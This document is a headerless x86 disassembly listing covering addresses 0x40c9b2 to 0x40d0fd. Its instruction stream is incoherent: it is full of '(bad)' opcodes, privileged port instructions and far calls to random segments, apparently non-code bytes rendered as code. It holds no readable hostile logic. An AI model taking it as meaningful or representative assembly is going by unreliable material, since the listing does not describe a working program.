  40c9b2:	rol    DWORD PTR ds:0x55939596,0x3f
  40c9b9:	ret    0x3c61
  40c9bc:	int    0xa0
  40c9be:	dec    esp
  40c9bf:	aas    
  40c9c0:	fisubr DWORD PTR [esp+eax*4+0x792a3847]
  40c9c7:	mov    al,0x23
  40c9c9:	dec    esp
  40c9ca:	push   es
  40c9cb:	xchg   esp,eax
  40c9cc:	dec    edi
  40c9cd:	fmul   st(7),st
  40c9cf:	xor    esi,ebp
  40c9d1:	dec    esp
  40c9d2:	pushf  
  40c9d3:	pop    ebp
  40c9d4:	jne    0x40ca1b
  40c9d6:	in     al,0x28
  40c9d8:	out    dx,eax
  40c9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9da:	lods   al,BYTE PTR ds:[esi]
  40c9db:	out    0x75,al
  40c9dd:	fwait
  40c9de:	or     eax,0x2126ccf1
  40c9e3:	jns    0x40c97b
  40c9e5:	je     0x40c9ba
  40c9e7:	fld    TBYTE PTR [esi]
  40c9e9:	sahf   
  40c9ea:	pop    esp
  40c9eb:	stos   BYTE PTR es:[edi],al
  40c9ec:	rcr    DWORD PTR [ecx],cl
  40c9ee:	dec    esi
  40c9ef:	push   ebx
  40c9f0:	ins    BYTE PTR es:[edi],dx
  40c9f1:	mov    ebp,0x9f1c8708
  40c9f6:	pusha  
  40c9f7:	(bad)  
  40c9f9:	scas   al,BYTE PTR es:[edi]
  40c9fa:	stos   BYTE PTR es:[edi],al
  40c9fb:	repz icebp 
  40c9fd:	mov    ds:0xc078ea17,eax
  40ca02:	xchg   DWORD PTR [ebp+0x25],ebp
  40ca05:	sub    edi,DWORD PTR [eax+eax*2]
  40ca08:	js     0x40c9e1
  40ca0a:	rol    BYTE PTR [eax],0xbd
  40ca0d:	shr    DWORD PTR [esi+0x4d],0x89
  40ca11:	mov    ebp,0x19496373
  40ca16:	pop    es
  40ca17:	repz push es
  40ca19:	imul   BYTE PTR [esi-0x5]
  40ca1c:	loopne 0x40ca17
  40ca1e:	fadd   st,st(3)
  40ca20:	push   0xdb058b94
  40ca25:	fild   QWORD PTR [ecx+0x1b]
  40ca28:	mov    ebx,0x500c7f4d
  40ca2d:	mov    al,ds:0x512169d9
  40ca32:	call   0xd955:0x89f5af91
  40ca39:	sar    DWORD PTR [ebx+0x72264b25],1
  40ca3f:	int3   
  40ca40:	enter  0x75de,0xe8
  40ca44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca45:	or     ebx,edx
  40ca47:	xor    BYTE PTR [esi+0x5417e25a],dh
  40ca4d:	and    BYTE PTR [edx],bh
  40ca4f:	sbb    DWORD PTR [ebx],ebp
  40ca51:	retf   0xd87
  40ca54:	js     0x40ca8d
  40ca56:	mov    ds:0xa42f81b5,al
  40ca5b:	das    
  40ca5c:	es scas eax,DWORD PTR es:[edi]
  40ca5e:	mov    dh,BYTE PTR [eax]
  40ca60:	push   eax
  40ca61:	push   ecx
  40ca62:	xchg   DWORD PTR [edx+0x26],ecx
  40ca65:	aaa    
  40ca66:	add    al,0x39
  40ca68:	push   ebx
  40ca69:	jae    0x40ca6e
  40ca6b:	adc    DWORD PTR [ebx],0xffffffcc
  40ca6e:	loop   0x40ca33
  40ca70:	fldcw  WORD PTR [edx-0x2fa5e432]
  40ca76:	enter  0x19ed,0xe
  40ca7a:	fbstp  TBYTE PTR [ebx-0x47ce5893]
  40ca80:	shr    DWORD PTR [eax-0x58de59c8],1
  40ca86:	stc    
  40ca87:	xchg   BYTE PTR [eax],dh
  40ca89:	dec    eax
  40ca8a:	add    eax,0xf564fb74
  40ca8f:	fcom   QWORD PTR [esi]
  40ca91:	cmp    dl,BYTE PTR ds:[edi+0x71]
  40ca95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca96:	hlt    
  40ca97:	add    cl,BYTE PTR [ebp+edx*4-0x50187af8]
  40ca9e:	mov    dh,0x9
  40caa0:	adc    BYTE PTR [edx],al
  40caa2:	mov    cl,BYTE PTR [edi]
  40caa4:	aas    
  40caa5:	push   0xffffff93
  40caa7:	inc    esi
  40caa8:	pop    es
  40caa9:	push   es
  40caaa:	and    BYTE PTR [ecx],dl
  40caac:	sbb    al,0x13
  40caae:	(bad)  [ecx]
  40cab0:	push   esp
  40cab1:	sub    eax,0xb8ffa452
  40cab6:	int3   
  40cab7:	mov    dl,0xea
  40cab9:	sub    ecx,DWORD PTR [edi-0x49533c76]
  40cabf:	push   edx
  40cac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cac1:	test   DWORD PTR [ecx-0x776c4ad2],eax
  40cac7:	push   edx
  40cac8:	mov    DWORD PTR [eax],eax
  40caca:	pop    edi
  40cacb:	nop
  40cacc:	jne    0x40ca6e
  40cace:	mov    dl,0x68
  40cad0:	push   eax
  40cad1:	lock xor BYTE PTR [edx+0x2c],al
  40cad5:	jne    0x40ca97
  40cad7:	ror    eax,0x7b
  40cada:	add    dl,0xf2
  40cadd:	fcom   DWORD PTR [ebx-0xf]
  40cae0:	lods   eax,DWORD PTR ds:[esi]
  40cae1:	inc    ebp
  40cae2:	inc    edi
  40cae3:	popa   
  40cae4:	push   ecx
  40cae5:	cdq    
  40cae6:	add    ch,BYTE PTR [ecx-0x2b]
  40cae9:	push   esi
  40caea:	aam    0xd1
  40caec:	rcr    BYTE PTR [ebx-0x7154c31d],1
  40caf2:	jne    0x40cadf
  40caf4:	jl     0x40cacd
  40caf6:	js     0x40cb2f
  40caf8:	clc    
  40caf9:	sub    DWORD PTR [eax],0xd15a8c40
  40caff:	rcl    dl,cl
  40cb01:	int    0xa1
  40cb03:	lods   eax,DWORD PTR ds:[esi]
  40cb04:	(bad)  
  40cb05:	fnstenv [ebx+ecx*8]
  40cb08:	adc    BYTE PTR [ebp+0x71],0xec
  40cb0c:	sbb    ch,bl
  40cb0e:	push   0x31350aaa
  40cb13:	push   esi
  40cb14:	stos   DWORD PTR es:[edi],eax
  40cb15:	sar    DWORD PTR [ebp-0x64],1
  40cb18:	mov    esp,DWORD PTR [ebp-0x19]
  40cb1b:	cli    
  40cb1c:	ror    DWORD PTR [esi+edx*8],1
  40cb1f:	or     ebp,esi
  40cb21:	adc    eax,0x3382f9f
  40cb26:	adc    al,0x2e
  40cb28:	cmp    ebx,DWORD PTR [ecx]
  40cb2a:	imul   ebp,DWORD PTR [ebp-0x136e326],0x73109bd1
  40cb34:	(bad)  
  40cb35:	mov    ebx,DWORD PTR [ecx+eax*4+0x63654cbf]
  40cb3c:	cmp    edi,DWORD PTR [eax]
  40cb3e:	xchg   eax,ebx
  40cb40:	xor    ebx,ecx
  40cb42:	jns    0x40caf7
  40cb44:	jb     0x40cb26
  40cb46:	add    eax,0xa66c792c
  40cb4b:	aam    0x9d
  40cb4d:	cmp    esp,edi
  40cb4f:	fbstp  TBYTE PTR [edx+ebx*4+0x35]
  40cb53:	push   esp
  40cb54:	idiv   BYTE PTR [edx+0x2dff2320]
  40cb5a:	add    eax,0x330899f7
  40cb5f:	ret    0x83a
  40cb62:	cld    
  40cb63:	fdivr  QWORD PTR [eax-0x5a57cbe1]
  40cb69:	adc    BYTE PTR [esi+eiz*8-0x7d],ch
  40cb6d:	nop
  40cb6e:	cmp    al,0xd8
  40cb70:	aad    0xff
  40cb72:	ds jae 0x40cba8
  40cb75:	inc    ecx
  40cb76:	mov    WORD PTR [esi+0x1d],?
  40cb79:	(bad)  
  40cb7b:	aad    0x7
  40cb7d:	add    DWORD PTR [ecx],ebx
  40cb7f:	popf   
  40cb80:	pushf  
  40cb81:	jns    0x40cb29
  40cb83:	and    ecx,0xad5f2aee
  40cb89:	adc    eax,0x38a74cf2
  40cb8e:	test   eax,0xd99f3219
  40cb93:	cld    
  40cb94:	and    eax,0x7c17d0f7
  40cb99:	dec    ecx
  40cb9a:	xor    DWORD PTR [ebx],ebp
  40cb9c:	inc    eax
  40cb9d:	cmp    eax,DWORD PTR [eax+0xe]
  40cba0:	jo     0x40cb47
  40cba2:	push   edi
  40cba3:	arpl   WORD PTR [edx+0x24],sp
  40cba6:	cmp    DWORD PTR [esp+eax*8+0x64],edx
  40cbaa:	icebp  
  40cbab:	push   ecx
  40cbac:	xchg   esp,eax
  40cbad:	pop    es
  40cbae:	test   al,0xfb
  40cbb0:	and    DWORD PTR [ebx+0x35],0x61c6ab09
  40cbb7:	outs   dx,BYTE PTR ds:[esi]
  40cbb8:	add    al,0x87
  40cbba:	shl    DWORD PTR [edi-0x302c24d1],0xc
  40cbc1:	xchg   ecx,eax
  40cbc2:	push   eax
  40cbc3:	call   0xa76b:0xe38fcf60
  40cbca:	and    al,0x91
  40cbcc:	(bad)  
  40cbcd:	ss pop esp
  40cbcf:	lahf   
  40cbd0:	loope  0x40cbf2
  40cbd2:	sar    BYTE PTR [esi-0x36],0x77
  40cbd6:	jno    0x40cc29
  40cbd8:	sbb    esi,DWORD PTR [ebx+0x7261ebee]
  40cbde:	add    ecx,DWORD PTR [edx-0x5]
  40cbe1:	or     DWORD PTR [ecx-0x34],edx
  40cbe4:	mov    edx,0x50767b4d
  40cbe9:	arpl   WORD PTR [ecx+0x6366ba01],dx
  40cbef:	jns    0x40cb8e
  40cbf1:	in     eax,0x81
  40cbf3:	xchg   edx,eax
  40cbf4:	xchg   edx,eax
  40cbf5:	dec    edi
  40cbf6:	popf   
  40cbf7:	xchg   ecx,eax
  40cbf8:	adc    BYTE PTR [edx],al
  40cbfa:	imul   BYTE PTR [edx-0x5306836c]
  40cc00:	ret    0x101d
  40cc03:	inc    esi
  40cc04:	ja     0x40cc5f
  40cc06:	int    0x1c
  40cc08:	adc    DWORD PTR [edx+0x14],0x563fd7d2
  40cc0f:	sbb    al,0x4f
  40cc11:	inc    ebx
  40cc12:	enter  0xa1ce,0x19
  40cc16:	pusha  
  40cc17:	mov    bh,0x27
  40cc19:	pop    edi
  40cc1a:	dec    eax
  40cc1b:	cli    
  40cc1c:	stc    
  40cc1d:	cwde   
  40cc1e:	clc    
  40cc1f:	jnp    0x40cc95
  40cc21:	xchg   ecx,eax
  40cc22:	sub    eax,0xd9d06c6c
  40cc27:	mov    ecx,DWORD PTR [eax+0x33c4b125]
  40cc2d:	pop    es
  40cc2e:	push   DWORD PTR [ebx]
  40cc30:	mov    ebx,0x4ad92598
  40cc35:	sbb    eax,0xcef6f085
  40cc3a:	cmp    edx,DWORD PTR [ebx+0x48]
  40cc3d:	xor    DWORD PTR [esi],ebp
  40cc3f:	push   edi
  40cc40:	shl    DWORD PTR [ebx+esi*1-0x22],cl
  40cc44:	mov    edx,0x560eddf1
  40cc49:	lahf   
  40cc4a:	add    DWORD PTR [edx],ebp
  40cc4c:	ftst   
  40cc4e:	push   edi
  40cc4f:	mov    ds,ebp
  40cc51:	and    ecx,DWORD PTR [ebp+0x7cca6179]
  40cc57:	cwde   
  40cc58:	xlat   BYTE PTR ds:[ebx]
  40cc59:	ds xchg edi,eax
  40cc5b:	fistp  QWORD PTR [edx]
  40cc5d:	adc    al,0xa2
  40cc5f:	ret    0x9f92
  40cc62:	add    BYTE PTR [eax+0x56],ah
  40cc65:	mov    dl,0xc7
  40cc67:	xor    cl,ch
  40cc69:	fisttp QWORD PTR [edx-0x24caede8]
  40cc6f:	fistp  WORD PTR [eax-0x2c]
  40cc72:	push   ecx
  40cc73:	(bad)  
  40cc74:	mov    eax,ebp
  40cc76:	fidiv  DWORD PTR [eax+0x2d]
  40cc79:	mov    WORD PTR [ebx],?
  40cc7b:	adc    ebp,edx
  40cc7d:	xchg   BYTE PTR [ebx],al
  40cc7f:	add    al,0xf7
  40cc81:	test   BYTE PTR [eax],0x3b
  40cc84:	xor    al,0xe3
  40cc86:	pop    edi
  40cc87:	sub    edx,ecx
  40cc89:	push   0xe487488b
  40cc8e:	dec    ebp
  40cc8f:	sbb    ch,BYTE PTR ds:0xb44d7ed3
  40cc95:	icebp  
  40cc96:	and    al,0xa3
  40cc98:	loop   0x40cc6f
  40cc9a:	fwait
  40cc9b:	mov    bh,0xdd
  40cc9d:	xor    ch,BYTE PTR [ecx+0xf]
  40cca0:	repnz xor BYTE PTR [edx+0x530f134f],ah
  40cca7:	and    eax,0x22730523
  40ccac:	or     edi,DWORD PTR ds:[ebp+0x77]
  40ccb0:	shr    ch,cl
  40ccb2:	pop    edx
  40ccb3:	aaa    
  40ccb4:	dec    edx
  40ccb5:	ffreep st(2)
  40ccb7:	rcr    DWORD PTR [edi+0x34eda17f],0x1f
  40ccbe:	dec    eax
  40ccbf:	popf   
  40ccc0:	in     eax,dx
  40ccc1:	int3   
  40ccc2:	fcmovu st,st(4)
  40ccc4:	or     esi,DWORD PTR [edx-0x13]
  40ccc7:	mov    ah,0xad
  40ccc9:	pop    ds
  40ccca:	push   es
  40cccb:	or     eax,0x42cc8693
  40ccd0:	or     eax,0x606347ed
  40ccd5:	xor    BYTE PTR [edx],0x8b
  40ccd8:	pop    edi
  40ccd9:	(bad)  
  40ccdb:	(bad)  
  40ccdc:	(bad)  
  40ccdd:	scas   eax,DWORD PTR es:[edi]
  40ccde:	mov    BYTE PTR [edi*1+0x5a55d5af],dl
  40cce5:	dec    edx
  40cce6:	enter  0xaa4b,0x9c
  40ccea:	pop    edx
  40cceb:	jl     0x40cc70
  40cced:	daa    
  40ccee:	lea    edi,[ebx-0x4a]
  40ccf1:	inc    ecx
  40ccf2:	call   0x7fff:0x86faa7ab
  40ccf9:	dec    ebp
  40ccfa:	cmp    bl,BYTE PTR [edx]
  40ccfc:	cld    
  40ccfd:	pushf  
  40ccfe:	lahf   
  40ccff:	sbb    bh,BYTE PTR [edx-0x7a]
  40cd02:	rcl    BYTE PTR [ecx],cl
  40cd04:	(bad)  
  40cd06:	and    DWORD PTR [edi+0x40],ebx
  40cd09:	lds    ebx,FWORD PTR [edx]
  40cd0b:	mov    dh,0x48
  40cd0d:	idiv   BYTE PTR [ebx]
  40cd0f:	enter  0x9ef8,0x1e
  40cd13:	or     eax,0x69fe3fff
  40cd18:	rcl    BYTE PTR ds:0x28a93df,1
  40cd1e:	out    0x5f,eax
  40cd20:	inc    esi
  40cd21:	scas   al,BYTE PTR es:[edi]
  40cd22:	mov    ecx,DWORD PTR [eax+0x94b4215]
  40cd28:	(bad)  
  40cd29:	(bad)  
  40cd2a:	scas   al,BYTE PTR es:[edi]
  40cd2b:	daa    
  40cd2c:	pop    es
  40cd2d:	mov    cl,0x97
  40cd2f:	test   BYTE PTR [esi-0x33],0x9b
  40cd33:	add    dh,dl
  40cd35:	fiadd  DWORD PTR [ebx-0x6dac2e36]
  40cd3b:	sti    
  40cd3c:	sub    DWORD PTR [ecx],0x77bd08e
  40cd42:	push   eax
  40cd43:	fnstcw WORD PTR [ecx]
  40cd45:	test   cl,dh
  40cd47:	cmp    BYTE PTR [esi+0x24],bh
  40cd4a:	mov    cl,0xbb
  40cd4c:	repnz mov ecx,0x1be7c035
  40cd52:	pop    edx
  40cd53:	push   ebx
  40cd54:	js     0x40cdc1
  40cd56:	jmp    0x40cd34
  40cd58:	jle    0x40cd02
  40cd5a:	psraw  mm6,QWORD PTR ds:0xeacc8250
  40cd61:	jg     0x40cd87
  40cd63:	stc    
  40cd64:	and    DWORD PTR [eax],ebx
  40cd66:	xchg   ecx,eax
  40cd67:	nop
  40cd68:	push   ecx
  40cd69:	xchg   DWORD PTR [edi-0x299d9ede],esp
  40cd6f:	xor    al,0x27
  40cd71:	push   esi
  40cd72:	(bad)  
  40cd73:	pminub mm0,QWORD PTR [ecx]
  40cd76:	lods   eax,DWORD PTR ds:[esi]
  40cd77:	xor    eax,0x53a21a55
  40cd7d:	pop    ds
  40cd7e:	clc    
  40cd7f:	test   ebx,ebp
  40cd81:	jo     0x40cde4
  40cd83:	push   edx
  40cd84:	addr16 pop esp
  40cd86:	push   esp
  40cd87:	push   es
  40cd88:	shr    DWORD PTR [edx-0x1fe02cbf],1
  40cd8e:	shl    edi,1
  40cd90:	(bad)  
  40cd91:	das    
  40cd92:	pop    ebx
  40cd93:	xchg   ebp,eax
  40cd94:	stc    
  40cd95:	call   DWORD PTR [edx+0x33]
  40cd98:	std    
  40cd99:	out    0xe5,al
  40cd9b:	in     al,0x36
  40cd9d:	fwait
  40cd9e:	jl     0x40cd7c
  40cda0:	jmp    0x40cdd6
  40cda2:	stos   DWORD PTR es:[edi],eax
  40cda3:	rcl    ebx,0xe8
  40cda6:	add    BYTE PTR [ebp+0x4a902145],ah
  40cdac:	jae    0x40cde6
  40cdae:	jae    0x40ce1e
  40cdb0:	lahf   
  40cdb1:	jno    0x40cd75
  40cdb3:	aam    0x7
  40cdb5:	cmp    eax,0x87ff1676
  40cdba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdbb:	test   eax,0x26928b7d
  40cdc0:	mov    al,ss:0x27a15b4e
  40cdc6:	jne    0x40cd48
  40cdc8:	retf   
  40cdc9:	in     al,dx
  40cdca:	jmp    0x40cd66
  40cdcc:	lods   al,BYTE PTR ds:[esi]
  40cdcd:	int    0xd0
  40cdcf:	pushf  
  40cdd0:	mov    edi,0x899ed790
  40cdd5:	xchg   edx,eax
  40cdd6:	clc    
  40cdd7:	mov    ds:0x2a2d8e07,al
  40cddc:	sub    al,0x91
  40cdde:	test   eax,0x83b0cf62
  40cde3:	mov    dh,0x5a
  40cde5:	mov    ds:0x56e5144e,al
  40cdea:	adc    edi,DWORD PTR [esi-0x1]
  40cded:	mov    ebx,0x610c9cab
  40cdf2:	cmp    BYTE PTR [ebx+0x5b],cl
  40cdf5:	test   BYTE PTR [esi+0x71113fc6],ch
  40cdfb:	xor    BYTE PTR [edi-0x6351dced],dh
  40ce01:	out    dx,eax
  40ce02:	xchg   edi,eax
  40ce03:	jnp    0x40cd8a
  40ce05:	ficom  DWORD PTR [esi+0x16]
  40ce08:	arpl   WORD PTR [edx+0x25098d6d],bx
  40ce0e:	in     eax,0xcf
  40ce10:	push   ds
  40ce11:	inc    ecx
  40ce12:	bound  ebp,QWORD PTR [ebp-0x1c]
  40ce15:	rcr    BYTE PTR [ebp+0x3e3e3e69],cl
  40ce1b:	ins    BYTE PTR es:[edi],dx
  40ce1c:	xor    eax,0x524f875c
  40ce21:	mov    dl,0xae
  40ce23:	pop    ds
  40ce24:	cmp    DWORD PTR [edi],edx
  40ce26:	lods   al,BYTE PTR ds:[esi]
  40ce27:	adc    al,0xd3
  40ce29:	xor    dh,ch
  40ce2b:	int    0x1
  40ce2d:	jb     0x40ce4c
  40ce2f:	enter  0x3d1c,0x99
  40ce33:	push   0xfffffff3
  40ce35:	mov    edx,0xe861b384
  40ce3a:	mov    ebp,0x2875bd59
  40ce3f:	and    esp,DWORD PTR [ebx+0x48]
  40ce42:	test   DWORD PTR [esi-0x63],ebp
  40ce45:	ror    BYTE PTR [bx-0x33],1
  40ce49:	jnp    0x40ce38
  40ce4b:	and    DWORD PTR [eax-0xaf270e4],eax
  40ce51:	stos   DWORD PTR es:[edi],eax
  40ce52:	shl    BYTE PTR [edi+0x5f],1
  40ce55:	ltr    WORD PTR [edi+0xe]
  40ce59:	mov    ebp,0x17e3e7f6
  40ce5e:	and    eax,0xdfe2b50a
  40ce63:	fisttp WORD PTR [edi+0x54b142ef]
  40ce69:	sub    ch,bl
  40ce6b:	test   eax,0x21cffce8
  40ce70:	fwait
  40ce71:	test   eax,0xbdcf3cda
  40ce76:	lahf   
  40ce77:	push   0x85ca383d
  40ce7c:	xchg   ebp,eax
  40ce7d:	push   esp
  40ce7e:	add    DWORD PTR [edi+0x43],edx
  40ce81:	or     dl,BYTE PTR [ecx-0x4cf23768]
  40ce87:	dec    edx
  40ce88:	add    esp,esi
  40ce8a:	dec    edi
  40ce8b:	jo     0x40ce65
  40ce8d:	push   0x49
  40ce8f:	push   es
  40ce90:	mov    ch,0xa6
  40ce92:	mov    edx,0x45d2e5a
  40ce97:	jns    0x40ceeb
  40ce99:	xlat   BYTE PTR ds:[ebx]
  40ce9a:	mov    eax,0x902efea6
  40ce9f:	sub    dl,BYTE PTR [ecx-0x7f839410]
  40cea5:	lock add al,BYTE PTR [ecx+esi*8+0xf9ee6bb]
  40cead:	hlt    
  40ceae:	inc    edx
  40ceaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb0:	stos   DWORD PTR es:[edi],eax
  40ceb1:	sbb    edx,esp
  40ceb3:	lea    eax,[edx+0x5c]
  40ceb6:	push   ebp
  40ceb7:	cwde   
  40ceb8:	xor    eax,0xb3e979f4
  40cebd:	cmp    esi,0x4b0e8acb
  40cec3:	(bad)  
  40cec4:	jecxz  0x40ce52
  40cec6:	addr16 adc dl,dl
  40cec9:	sub    esp,edx
  40cecb:	enter  0xcd93,0xfd
  40cecf:	dec    ebx
  40ced0:	xor    cl,BYTE PTR [ebx+0x6f]
  40ced3:	fdiv   DWORD PTR [ebx+0x1b]
  40ced6:	into   
  40ced7:	hlt    
  40ced8:	dec    ebx
  40ced9:	mov    ds:0x668d0677,eax
  40cede:	and    DWORD PTR [ebx],esi
  40cee0:	dec    edx
  40cee1:	jne    0x40ce6e
  40cee3:	inc    ebp
  40cee4:	inc    esp
  40cee5:	pop    ecx
  40cee6:	add    eax,0x2d13a813
  40ceeb:	je     0x40ceab
  40ceed:	adc    ebx,DWORD PTR [edx]
  40ceef:	fstp   QWORD PTR [ebx]
  40cef1:	cmp    dh,BYTE PTR [esi]
  40cef3:	dec    ebp
  40cef4:	inc    esi
  40cef5:	lods   al,BYTE PTR ds:[esi]
  40cef6:	mov    ebx,0xa7611af5
  40cefb:	mov    ah,0x78
  40cefd:	lahf   
  40cefe:	sbb    al,0xc
  40cf00:	rcr    DWORD PTR [edi+0x7b6b9708],0x5d
  40cf07:	mov    ah,0xdc
  40cf09:	idiv   BYTE PTR [edi-0x2f]
  40cf0c:	mov    ds:0xf415b1f1,al
  40cf11:	loope  0x40ceb4
  40cf13:	pop    ebx
  40cf14:	inc    ebp
  40cf15:	cmp    DWORD PTR [edx-0x7611e90e],0x3c
  40cf1c:	cmp    al,0x42
  40cf1e:	pop    ebx
  40cf1f:	test   eax,0x4f416fcb
  40cf24:	call   0xd20e:0x64d9a952
  40cf2b:	inc    BYTE PTR [esp+ecx*8-0xa95ed83]
  40cf32:	sar    ebx,0x3d
  40cf35:	cmp    al,0xea
  40cf37:	mov    ebp,0x5038db92
  40cf3c:	xchg   ecx,eax
  40cf3d:	sbb    eax,0xa003c5d0
  40cf42:	test   eax,0x6d584856
  40cf47:	data16 mov cl,0x99
  40cf4a:	dec    ebx
  40cf4b:	pop    ebx
  40cf4c:	scas   al,BYTE PTR es:[edi]
  40cf4d:	out    dx,al
  40cf4e:	repnz pop edi
  40cf50:	(bad)  [eax-0x1d]
  40cf53:	mov    BYTE PTR [ecx+0x61e30f17],dh
  40cf59:	adc    ah,BYTE PTR [esi-0x4723650a]
  40cf5f:	push   esp
  40cf60:	lock (bad) 
  40cf62:	or     DWORD PTR [edx*4+0xc05152e],edi
  40cf69:	std    
  40cf6a:	(bad)  
  40cf6b:	jmp    0x40cf9b
  40cf6d:	mov    dh,0xb3
  40cf6f:	out    0xd8,al
  40cf71:	inc    ebp
  40cf72:	or     edx,edx
  40cf74:	jns    0x40cf8f
  40cf76:	inc    esp
  40cf77:	and    ecx,DWORD PTR [edi]
  40cf79:	mov    eax,ds:0x4b8bf6da
  40cf7e:	test   eax,0x5ff4b596
  40cf83:	enter  0x7b69,0x1
  40cf87:	pop    ebp
  40cf88:	jl     0x40cf33
  40cf8a:	jl     0x40cf3e
  40cf8c:	dec    edi
  40cf8d:	jae    0x40cfe7
  40cf8f:	ins    DWORD PTR es:[edi],dx
  40cf90:	add    DWORD PTR [edi+0x26],eax
  40cf93:	inc    eax
  40cf94:	fisttp DWORD PTR ds:0x90ddbfb4
  40cf9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf9b:	cmp    BYTE PTR [eax+0x6d],0x91
  40cf9f:	loop   0x40cf7f
  40cfa1:	and    BYTE PTR [esi+eax*2+0x6081371e],0x26
  40cfa9:	(bad)  [esp+ebp*4]
  40cfac:	enter  0xb52f,0xb6
  40cfb0:	xchg   esi,eax
  40cfb1:	pop    es
  40cfb2:	daa    
  40cfb3:	jns    0x40cf55
  40cfb5:	sbb    al,0xcd
  40cfb7:	hlt    
  40cfb8:	mov    WORD PTR [edi-0x3c],fs
  40cfbb:	sbb    al,0x98
  40cfbd:	jns    0x40cfff
  40cfbf:	xchg   DWORD PTR [ecx-0x2440b300],edx
  40cfc5:	outs   dx,DWORD PTR ds:[esi]
  40cfc6:	adc    ax,0x419a
  40cfca:	push   0x7
  40cfcc:	inc    edx
  40cfcd:	ins    DWORD PTR es:[edi],dx
  40cfce:	in     eax,dx
  40cfcf:	int3   
  40cfd0:	outs   dx,DWORD PTR ds:[esi]
  40cfd1:	das    
  40cfd2:	push   0xb
  40cfd4:	push   edi
  40cfd5:	fst    st(6)
  40cfd7:	push   0x7a
  40cfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfda:	loop   0x40cf5f
  40cfdc:	add    dh,ch
  40cfde:	mov    ah,0x4b
  40cfe0:	dec    esi
  40cfe1:	das    
  40cfe2:	sub    BYTE PTR [edi-0x52],dl
  40cfe5:	cli    
  40cfe6:	push   esi
  40cfe7:	xchg   ebp,eax
  40cfe8:	pop    esp
  40cfe9:	es sti 
  40cfeb:	push   DWORD PTR [eax+ebx*4-0x4a911050]
  40cff2:	sub    ah,ah
  40cff4:	dec    ebp
  40cff5:	inc    ecx
  40cff6:	out    dx,eax
  40cff7:	mov    ebx,0xee6dd2d2
  40cffc:	jmp    0xc82fb39b
  40d001:	fsubr  QWORD PTR [ebp+0x6061995b]
  40d007:	out    0xfb,eax
  40d009:	div    DWORD PTR [ecx+0x666ac148]
  40d00f:	stos   BYTE PTR es:[edi],al
  40d010:	adc    al,0x20
  40d012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d013:	mov    eax,ds:0x9c40cd61
  40d018:	adc    cl,cl
  40d01a:	cmp    edi,DWORD PTR [edx]
  40d01c:	xchg   ebp,eax
  40d01d:	xor    bh,BYTE PTR [ebp+0x5bec83b2]
  40d023:	ds xchg esp,eax
  40d025:	arpl   WORD PTR [ebx-0x48],di
  40d028:	inc    bx
  40d02a:	xchg   ebx,eax
  40d02b:	or     ebp,esi
  40d02d:	retf   
  40d02e:	jne    0x40d010
  40d030:	push   es
  40d031:	stos   DWORD PTR es:[edi],eax
  40d032:	mov    BYTE PTR [ecx-0x297946be],al
  40d038:	shl    dl,0x1b
  40d03b:	xchg   edi,eax
  40d03c:	gs (bad) 
  40d03e:	outs   dx,DWORD PTR ds:[esi]
  40d03f:	xor    DWORD PTR [ecx+esi*1+0x532f3c42],0xae0d5138
  40d04a:	sub    eax,0x7b15517d
  40d04f:	sbb    BYTE PTR [ebx+ebx*8],bh
  40d052:	clc    
  40d053:	cld    
  40d054:	in     al,0xae
  40d056:	xor    al,ah
  40d058:	inc    esp
  40d059:	sbb    al,0x49
  40d05b:	aad    0x36
  40d05d:	les    esp,FWORD PTR [ebx+0x619bd0ad]
  40d063:	dec    DWORD PTR [eax]
  40d065:	pop    esp
  40d066:	int    0xda
  40d068:	mov    esi,0x4972bd8c
  40d06d:	sub    DWORD PTR ds:0x6ca5f05e,ebx
  40d073:	push   es
  40d074:	and    ah,BYTE PTR [ebx]
  40d076:	icebp  
  40d077:	inc    esp
  40d078:	push   esp
  40d079:	pop    ebx
  40d07a:	pop    ds
  40d07b:	mov    eax,0x9d7423a5
  40d080:	aas    
  40d081:	pop    eax
  40d082:	bound  esp,QWORD PTR [edx-0x1e]
  40d085:	out    0xd2,al
  40d087:	mov    ecx,0x5769eda3
  40d08c:	mov    dh,0xb1
  40d08e:	push   ebx
  40d08f:	dec    ebp
  40d090:	lahf   
  40d091:	dec    esi
  40d092:	lods   eax,DWORD PTR ds:[esi]
  40d093:	jns    0x40d01c
  40d095:	outs   dx,DWORD PTR ds:[esi]
  40d096:	push   ds
  40d097:	mov    esp,0x9739afd0
  40d09c:	jb     0x40d06f
  40d09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d09f:	arpl   WORD PTR [esi],bx
  40d0a1:	xchg   ecx,eax
  40d0a2:	pop    ecx
  40d0a3:	add    ebx,DWORD PTR [esi+0x4]
  40d0a6:	mov    BYTE PTR [edx-0x5eaec1e5],ch
  40d0ac:	inc    eax
  40d0ad:	and    al,0xaa
  40d0af:	mov    eax,ds:0x452a4338
  40d0b4:	sub    al,0xd6
  40d0b6:	jmp    0xae7c741e
  40d0bb:	ja     0x40d0ef
  40d0bd:	adc    ecx,esi
  40d0bf:	aas    
  40d0c0:	mov    ah,0xe0
  40d0c2:	call   0xe12d:0xacd4fa6
  40d0c9:	mov    edi,0x48b4fbce
  40d0ce:	dec    esi
  40d0cf:	xchg   edx,eax
  40d0d0:	jl     0x40d072
  40d0d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0d3:	js     0x40d08f
  40d0d5:	retf   
  40d0d6:	jmp    0xca6c9664
  40d0db:	fistp  DWORD PTR [esi*4-0x4ef4e8d6]
  40d0e2:	dec    esp
  40d0e3:	add    BYTE PTR ds:0x8fb2c32c,bl
  40d0e9:	inc    edi
  40d0ea:	stc    
  40d0eb:	jle    0x40d0b5
  40d0ed:	out    0x38,al
  40d0ef:	lds    edi,FWORD PTR [ebx+0x5b]
  40d0f2:	sahf   
  40d0f3:	and    ah,BYTE PTR [ebx]
  40d0f5:	lds    edi,FWORD PTR [edx-0x357cec58]
  40d0fb:	adc    eax,DWORD PTR [eax]
  40d0fd:	icebp  
